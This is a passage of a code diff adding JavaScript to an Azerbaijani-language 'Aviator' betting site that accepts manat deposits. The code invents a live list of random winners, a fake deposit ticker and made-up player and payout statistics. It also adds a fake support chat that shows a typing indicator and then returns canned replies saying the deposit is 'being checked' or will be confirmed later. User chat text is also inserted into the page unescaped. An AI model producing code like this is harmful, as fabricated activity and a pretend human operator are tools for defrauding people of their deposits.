+        const amount = (Math.random() * 300 + 10).toFixed(2);
+        html += '<div class="player-row"><span class="name">' + name + '</span><span class="win">+' + amount + ' ₼ (' + mult + 'x)</span></div>';
+    }
+    list.innerHTML = html;
+}
+
+// ========== DEPOZİT LENTİ ==========
+function startDepositTicker() {
+    if (tickerInterval) clearInterval(tickerInterval);
+    updateTicker();
+    tickerInterval = setInterval(updateTicker, 4000);
+}
+
+function updateTicker() {
+    const ticker = document.getElementById('depositTicker');
+    if (!ticker) return;
+    const name = sampleNames[Math.floor(Math.random() * sampleNames.length)];
+    const amount = [10, 20, 50, 100, 200, 500][Math.floor(Math.random() * 6)];
+    const minAgo = Math.floor(Math.random() * 10) + 1;
+    ticker.innerHTML = '<div class="ticker-item"><span class="user">' + name + '</span><span class="amount">' + amount + ' ₼</span><span class="time">' + minAgo + ' dəq əvvəl</span></div>';
+}
+
+// ========== STATİSTİKA ==========
+function startStatsUpdater() {
+    if (statsInterval) clearInterval(statsInterval);
+    statsInterval = setInterval(function() {
+        const online = 1100 + Math.floor(Math.random() * 300);
+        const today = 3700 + Math.floor(Math.random() * 300);
+        const total = 120000 + Math.floor(Math.random() * 10000);
+        const el1 = document.getElementById('statOnline');
+        const el2 = document.getElementById('statToday');
+        const el3 = document.getElementById('statTotal');
+        if (el1) el1.textContent = online.toLocaleString();
+        if (el2) el2.textContent = today.toLocaleString();
+        if (el3) el3.textContent = total.toLocaleString() + ' ₼';
+    }, 5000);
+}
+
+// ========== CHAT ==========
+function toggleChat() {
+    document.getElementById('chatBox').classList.toggle('hidden');
+}
+
+function sendChat() {
+    const input = document.getElementById('chatInput');
+    const text = input.value.trim();
+    if (!text) return;
+    input.value = '';
+
+    const body = document.getElementById('chatBody');
+    body.innerHTML += '<div class="chat-msg user">' + text + '</div>';
+    body.scrollTop = body.scrollHeight;
+
+    const typing = document.getElementById('chatTyping');
+    typing.classList.remove('hidden');
+
+    setTimeout(function() {
+        typing.classList.add('hidden');
+        const replies = [
+            'Depozitiniz yoxlanılır, zəhmət olmasa gözləyin. ⏳',
+            'Ödəniş şöbəsi tərəfindən yoxlanılır. 30 dəqiqə ərzində təsdiqlənəcək.',
+            'Anlayışınız üçün təşəkkür edirik. Tezliklə cavab veriləcək.',
+            'Operator hazırda başqa müştəri ilə məşğuldur, gözləyin.',
+            'Müraciətiniz qeydə alındı. 24 saat ərzində cavab veriləcək.'
+        ];
+        const reply = replies[Math.floor(Math.random() * replies.length)];
+        body.innerHTML += '<div class="chat-msg operator">' + reply + '</div>';
+        body.scrollTop = body.scrollHeight;
+    }, 2000 + Math.random() * 2000);
+}
+
 // ========== AUTO-LOGIN ==========
 window.addEventListener('load', function() {
+    // 18+ yoxla
+    let ageOk = null;
+    try { ageOk = localStorage.getItem('aviator_age_ok'); } catch (e) {}
+    if (ageOk === '1') {
+        document.getElementById('ageGate').classList.add('hidden');
+    }
+
     let saved = null;
     try { saved = localStorage.getItem('aviator_current'); } catch (e) {}
-
     if (saved) {
         const users = getUsers();
         if (users[saved]) {
             currentUser = saved;
             showDepositScreen(users[saved]);
+            showProfile(users[saved]);
+            startLivePlayers();
+            startDepositTicker();
+            startStatsUpdater();
         } else {
             try { localStorage.removeItem('aviator_current'); } catch (e) {}
         }
+    } else {
+        // Giriş ekranında da canlı məlumatları göstər
+        startLivePlayers();
+        startDepositTicker();
+        startStatsUpdater();
     }
 });
 
